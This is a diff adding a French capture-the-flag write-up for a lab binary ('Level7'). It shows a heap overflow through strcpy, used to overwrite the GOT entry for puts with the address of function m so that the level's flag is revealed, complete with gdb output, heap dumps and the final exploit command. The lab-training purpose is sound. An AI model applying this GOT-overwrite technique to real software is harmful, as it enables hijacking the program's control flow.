@@ -1,36 +1,113 @@
-08049928 puts
+### Level7
 
-080484f4 m
+Dans la fonction main du programme, on s'apercoit qu'il y a quatre allocations consecutives de 8 octets avec malloc. Ensuite, un strcpy nous permet d'ecrire dans ces mallocs a l'aide des parametres 1 et 2 passes en arguments du programme.
 
-malloc(8);
-puVar1[0] = 1;
-puVar1[1] = malloc(8);
+On verifie l'offset :
 
-malloc(8);
-puVar3[0] = 2;
-puVar3[1] = malloc(8);
+    gdb ./level6
+    (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag CCCC
 
-00000000 puvar1 8
-00000000 pvvar2 8 
-00000000 puvar3 8
-00000000 pvvar2 8
+    Program received signal SIGSEGV, Segmentation fault.
+    0xb7eb8f52 in ?? ()
+
+Register value EDX : 
+
+    0x37614136
+
+Offset :
+
+    20
+
+On se rend compte ici qu'on ne peut pas ecraser le registre EIP pour faire saute le programme ou on le souhaite. Peut importe si c'est le premier ou le deuxieme argument.
+Seul le registre EDX est impactee par le buffer overflow.
+Le premier strcpy va permettre d'ecraser la memoire dans la heap.
+Le but va etre ici d'ecrire l'adresse de 'puts' dans la plage memoire de la quatrieme allocation grace au premier strcpy. Ensuite il sera ecrase par l'adresse de la fonction 'm' qu'on injectera grace au second strcpy dans la quatrieme plage memoire alloue par malloc. Cela va permettre au programme d'appeler la fonction 'm' a la place la fonction 'puts'. La fonction 'm' nous devoile la variable 'c' qui contient le flag du niveau suivant.
+
+On demarre avec le pattern suivant :
+
+	./level7 $(python -c 'print "A" * 20 + "BBBB"') $(python -c 'print "CCCC"')
+
+Valeur EAX apres chaque malloc dans l'odre :
+
+	Premier malloc(8) ==> 0x804a008
+	Deuxieme malloc(8) ==> 0x804a018
+	Troisieme malloc(8) ==> 0x804a028
+	Quatrieme malloc(8) ==> 0x804a038
 
 
-./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print"\xf4\x84\x04\x08"')
+Pour voir la heap, on utlise :
+
+	info proc mappings
+
+On obtient :
+
+	process 5497
+	Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	0x8048000  0x8049000     0x1000        0x0 /home/user/level7/level7
+	0x8049000  0x804a000     0x1000        0x0 /home/user/level7/level7
+	0x804a000  0x806b000    0x21000        0x0 [heap]
+	[...]
+
+Etat de la heap apres tout les malloc :
+
+	Les single quotes indique les adresses attribuees aux 4 malloc dans l'ordre de haut en bas.
+	
+	(gdb) x/16x 0x804a000
+	0x804a000:	0x00000000	0x00000011 '0x00000001' 0x0804a018	==> Correspond a l'adresse de retour d'allocation du deuxieme malloc (puvar1[1] = puvar2)
+	0x804a010:	0x00000000	0x00000011 '0x00000000' 0x00000000
+	0x804a020:	0x00000000	0x00000011 '0x00000002' 0x0804a038	==> Correspond a l'adresse de retour d'allocation du quatrieme malloc (puvar3[1] = puvar2)
+	0x804a030:	0x00000000	0x00000011 '0x00000000' 0x00000000
+
+Etat de la heap apres premier strcpy :
+
+	(gdb) x/16x 0x804a000
+	0x804a000:	0x00000000	0x00000011 '0x00000001' 0x0804a018
+	0x804a010:	0x00000000	0x00000011 '0x41414141'	0x41414141
+	0x804a020:	0x41414141	0x41414141 '0x41414141' 0x42424242
+	0x804a030:	0x00000000	0x00000011 '0x00000000'	0x00000000
+
+Ici le premier strcpy ecrit a partir du puvar1[1], et inscrit en memoire 20 fois A, ecrasant la memoire de la 3eme allocation.
+La chaine 'BBBB' (0x42424242) est inscrit a la place du puvar3[1] anciennement l'adresse retourne par le quatrieme malloc.
+Le deuxieme strcpy nous permettera d'ecrire sur l'adresse 0x42424242 dans notre exemple.
+
+Maintenant on va remplacer 'BBBB' par l'adresse de 'puts' et 'CCCC' par l'adresse de 'm'.
+
+Pour trouver l'adresse du GOT puts :
+
+	objdump -R ./level7 
+
+	./level7:     file format elf32-i386
+
+	DYNAMIC RELOCATION RECORDS
+	OFFSET   TYPE              VALUE 
+	08049904 R_386_GLOB_DAT    __gmon_start__
+	08049914 R_386_JUMP_SLOT   printf
+	08049918 R_386_JUMP_SLOT   fgets
+	0804991c R_386_JUMP_SLOT   time
+	08049920 R_386_JUMP_SLOT   strcpy
+	08049924 R_386_JUMP_SLOT   malloc
+	08049928 R_386_JUMP_SLOT   puts
+	0804992c R_386_JUMP_SLOT   __gmon_start__
+	08049930 R_386_JUMP_SLOT   __libc_start_main
+	08049934 R_386_JUMP_SLOT   fopen
+
+L'adresse du puts dans notre code est ne fait un pointeur vers l'adresse du GOT puts.
+Le GOT permet de faire des réadressage pour pointer vers les veritables fonctions.
+Donc si on met l'adresse du GOT puts et qu'on l'ecrase par une autre adresse, le puts utilisera desormais l'adresse qu'on a modifiee.
+
+Pour trouver l'adress de 'm' :
+
+	(gdb) p m
+	$1 = {<text variable, no debug info>} 0x80484f4 <m>
 
 
-+-----------------------+  <- Bloc puVar1 (8 octets)
-|    0x00000001        |  <- Contenu de puVar1 (4 octets)
-|-----------------------|
-|   Pointeur vers pvVar2|  <- Contenu de puVar1 + 4 (4 octets)
-+-----------------------+
-|    0x00000002        |  <- Contenu de puVar3 (4 octets)
-|-----------------------|
-|   Pointeur vers pvVar2|  <- Contenu de puVar3 + 4 (4 octets)
-+-----------------------+
-|                       |  <- Zone mémoire pour pvVar2 (8 octets)
-|                       |
-|-----------------------|
-|                       |  <- Zone mémoire pour pvVar2 (8 octets)
-|                       |
-+-----------------------+
+Adresse final :
+
+	puts : 	0x08049928 => \x28\x99\x04\x08
+	m : 	0x080484f4 => \xf4\x84\x04\x08
+
+Commande shellcode final :
+
+	./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print"\xf4\x84\x04\x08"')
